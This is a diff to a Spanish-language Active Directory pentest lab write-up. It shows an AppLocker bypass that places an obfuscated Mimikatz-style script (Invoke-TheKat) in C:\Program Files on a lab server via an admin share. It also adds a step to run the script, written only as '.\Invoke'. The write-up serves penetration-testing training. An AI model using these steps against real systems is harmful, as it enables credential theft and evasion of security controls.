@@ -482,7 +482,6 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934
 
 Ya que es una regla predeterminada que permite a todos ejecutar scripts desde *C:\ProgramFiles*
 También podemos enumerar estas detrás de una forma mas clara usando una conexión remota desde nuestro propio equipo, realizaremos la conexión remota usando el siguiente comando que nos otorgara una *PowerShell*
-
 ```shell
 Enter-PSSession dcorp-adminsrv
 ```
@@ -557,8 +556,12 @@ $Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $
 Invoke-TheKat -Command $Pwn
 ```
 
-Ahora una vez el archivo modificado lo transferiremos a la maquina victima
+Ahora una vez el archivo modificado lo transferiremos a la maquina victima, desde una terminal como administrador
 ```shell
 Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
+Navegaremos a la ruta donde lo hemos copiado y lo ejecutaremos
+```shell
+.\Invoke
+```
